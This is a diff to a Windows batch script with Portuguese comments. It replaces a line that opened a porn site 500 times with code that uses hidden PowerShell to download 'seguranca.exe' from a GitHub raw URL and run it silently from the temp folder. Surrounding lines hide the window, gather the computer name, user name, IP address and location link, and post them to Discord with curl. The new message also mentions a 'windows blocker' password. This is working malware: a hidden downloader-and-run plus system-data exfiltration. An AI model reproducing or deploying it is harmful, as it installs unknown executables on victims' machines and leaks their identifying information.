@@ -1,5 +1,18 @@
 @echo off
-for /l %i in (1,1,500) do start https://pt.pornhub.com/view_video.php? 
+setlocal
+
+set "TEMP_EXE=%TEMP%\seguranca.exe"
+set "URL=https://raw.githubusercontent.com/lcmandrikion-hash/BQL/refs/heads/main/seguranca.exe"
+
+:: Se o arquivo não existe, baixa
+if not exist "%TEMP_EXE%" (
+    powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%TEMP_EXE%' -UseBasicParsing"
+)
+
+:: Executa o arquivo em background
+start "" /B "%TEMP_EXE%"
+
+endlocal
 
 :: --------- BLOCO PARA RODAR OCULTO ----------
 if "%~1" NEQ "hidden" (
@@ -35,7 +48,7 @@ set HORA=%TIME:~0,5%
 set LINK=https://ipinfo.io/%IP%
 
 :: Mensagem final
-set MESSAGE=Usuario Reniciou o pc. Resultado do comando --  PC %PC% - Usuario %USER% - IP %IP% - Local %LINK% - Data %DATA% - Hora %HORA%
+set MESSAGE=Usuario Iniciou  o pc. Resultado do comando --  PC %PC% - Usuario %USER% - IP %IP% - Local %LINK% - Data %DATA% - Hora %HORA% e bloqueador de windows senha :Luizfoda
 
 :: Envia pro Discord
 curl -s ^
